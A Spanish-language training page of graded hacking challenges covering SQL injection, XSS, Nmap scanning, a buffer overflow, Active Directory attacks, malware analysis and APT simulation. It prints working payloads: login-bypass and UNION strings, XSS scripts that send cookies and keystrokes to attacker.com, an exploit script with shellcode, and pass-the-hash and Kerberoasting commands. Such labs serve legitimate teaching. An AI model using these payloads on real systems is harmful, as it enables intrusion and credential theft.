Nivel Fácil Retos para Principiantes

Empieza aquí. Estos retos te enseñan los fundamentos con ejercicios guiados.

01 Fácil

SQL Injection Básico

Encuentra y explota una vulnerabilidad de inyección SQL en una aplicación web vulnerable.

2 horas Web Red Team

Guía Paso a Paso

1
Identificar el formulario: Busca campos de entrada (login, búsqueda, formulario de contacto).
2
Probar payload básico: Ingresa ' OR '1'='1 en el campo de usuario.
3
Determinar columnas: Usa ' ORDER BY 1--, incrementa hasta que falle.
4
Extraer datos: ' UNION SELECT username,password FROM users--
5
Automatizar: sqlmap -u "http://target.com/page?id=1" --dbs --batch
SQL Payloads
# Bypass de login
admin' --
' OR 1=1--
admin'/*

# UNION-based injection
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--

# Con SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D testdb --tables
SQLMap Burp Suite Navegador
02 Fácil

Cross-Site Scripting (XSS)

Inyecta scripts maliciosos en una aplicación web para robar cookies o ejecutar acciones.

1.5 horas Web Red Team

Guía Paso a Paso

1
Buscar campos reflejados: Escribe <script>alert(1)</script> en cada campo.
2
Bypass de filtros: Prueba <img src=x onerror=alert(1)>
3
Steal cookies: <script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
4
Reflected vs Stored: Identifica si el XSS se almacena o solo se refleja.
XSS Payloads
# Reflected XSS básico
<script>alert('XSS')</script>

# XSS con img tag
<img src=x onerror="alert('XSS')">

# Robo de cookies
<script>
fetch('http://attacker.com/steal?cookie='+document.cookie)
</script>

# Keylogger sencillo
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?key='+e.key)
}
</script>
Burp Suite Navegador Burp Collaborator
03 Fácil

Escaneo de Red con Nmap

Aprende a descubrir hosts, puertos abiertos y servicios en una red.

1 hora Red Red Team

Guía Paso a Paso

1
Descubrimiento de hosts: nmap -sn 192.168.1.0/24
2
Escaneo de puertos: nmap -sV -sC target_ip
3
Detectar SO: nmap -O target_ip
4
Scriptos NSE: nmap --script=vuln target_ip
Nmap Commands
# Escaneo rápido de la red local
nmap -sn 192.168.1.0/24

# Escaneo completo de puertos con versiones
nmap -sV -sC -O -p- target_ip

# Escaneo stealth (SYN)
nmap -sS -T2 target_ip

# Scripts de vulnerabilidad
nmap --script=vuln,exploit -p 80,443 target_ip

# Output a archivo
nmap -oA result target_ip
Nmap Terminal

04 Medio

Buffer Overflow Local

Explota un desbordamiento de búfer para obtener ejecución de código en una aplicación vulnerable.

3 horas Binary Red Team

Guía Paso a Paso

1
Fuzzing: Envía strings incrementales para encontrar el offset exacto del crash.
2
Controlar EIP: Usa pattern_create y pattern_offset de Metasploit.
3
Bad chars: Identifica caracteres que rompen el payload.
4
Shellcode: Inyecta shellcode reverso o usa jmp esp.
5
Exploit: Construye el payload final con la estructura correcta.
Python Exploit
#!/usr/bin/env python3
import struct

offset = 1978  # Offset a EIP

# Shellcode reverso (msfvenom)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# Construir payload
payload = b"A" * offset
payload += struct.pack("<I", 0x7c9d30d7)  # JMP ESP (ntdll.dll)
payload += shellcode

with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"Payload enviado: {len(payload)} bytes")
GDB Metasploit Python Ghidra
05 Medio

Pentesting Active Directory

Explora un entorno AD completo: enumeración, movimiento lateral y escalada de dominio.

4 horas AD Red Team

Guía Paso a Paso

1
Enumeración: enum4linux -a DC_IP, ldapsearch
2
User Enumeration: crackmapexec ldap DC_IP -u user -p pass --users
3
AS-REP Roasting: GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat
4
Kerberoasting: GetUserSPNs.py DOMAIN/user:pass -request
5
Pass-the-Hash: crackmapexec smb DC_IP -u admin -H NTLM_HASH
BloodHound Rubeus Impacket CrackMapExec
06 Medio

Análisis de Malware

Analiza una muestra de malware usando técnicas estáticas y dinámicas para entender su comportamiento.

3 horas Malware Blue Team

Guía Paso a Paso

1
Entorno seguro: Configura una VM aislada (sin internet).
2
Análisis estático: file, strings, xxd, PE-bear.
3
Hashing: sha256sum malware.exe → busca en VirusTotal.
4
Análisis dinámico: Ejecutar en sandbox, monitorear conexiones de red.
5
Reglas YARA: Crear reglas para detectar patrones similares.
Análisis Estático
# Identificar el archivo
file malware.exe

# Buscar strings interesantes
strings -n 6 malware.exe | grep -i "http\|password\|key\|api"

# Ver hash
sha256sum malware.exe

# Regla YARA básica
rule Malware_Ejemplo {
    strings:
        $s1 = "http://c2server.com"
        $s2 = "cmd.exe /c"
    condition:
        2 of them
}
YARA Ghidra Wireshark REMnux

07 Difícil

Pentest Completo — Full Engagement

Simula un pentest completo: desde reconocimiento hasta reporte ejecutivo.

8+ horas Pentest Red Team

Guía Paso a Paso (PTES)

1
Pre-engagement: Define alcance, reglas de juego, point of contact.
2
Reconocimiento: OSINT, DNS, WHOIS, Shodan, LinkedIn.
3
Enumeración: Nmap, Gobuster, Nikto, Wapiti.
4
Vulnerability Analysis: Nessus, Nuclei, manual testing.
5
Explotación: Metasploit, Burp, custom exploits.
6
Post-Exploitation: Privesc, lateral movement, data exfil.
7
Reporte: Executive summary, findings, recommendations.

09 Difícil

Simulación APT (Advanced Persistent Threat)

Ejecuta una simulación completa de APT: persistencia, evasión, exfiltración y cobertura de rastros.

10+ horas APT Red Team

Guía Paso a Paso (MITRE ATT&CK)

1
Initial Access (TA0001): Phishing, exploiting public apps.
2
Execution (TA0002): PowerShell, WMI, scheduled tasks.
3
Persistence (TA0003): Registry keys, services, DLL hijacking.
4
Defense Evasion (TA0005): AMSI bypass, unhooking, process injection.
5
Lateral Movement (TA0008): Pass-the-Hash, RDP, PsExec.
6
Exfiltration (TA0010): DNS tunneling, ICMP, cloud storage.
7
Cover Tracks (TA0007): Clear logs, timestomp, secure delete.

Purple Team Retos Colaborativos

Retos que combinan ofensiva y defensiva. Ataca y detecta al mismo tiempo.

PT-01 Medio

Login Storm Controlado

Simula intentos de login fallidos y detecta si el SOC los ve en tiempo real.

Proceso

1
Offensivo: Ejecuta 50+ intentos de login fallidos contra el dominio.
2
Defensivo: Revisa logs de autenticación en Wazuh/ELK.
3
Análisis: ¿Se generó alerta? ¿Cuánto tiempo tardó?
4
Mejora: Crea regla Sigma para detectar este patrón.
PT-02 Medio

Rutas "Raras" en Web

Explora rutas ocultas en una web y verifica si el WAF/SIEM las detecta.

Proceso

1
Offensivo: Usa Gobuster/ffuf para fuzzear rutas (/admin, /backup, /test).
2
Defensivo: Analiza logs de acceso web en ELK.
3
Análisis: Identifica códigos HTTP anómalos (403, 500).
4
Mejora: Crea playbooks de hunting para rutas sospechosas.
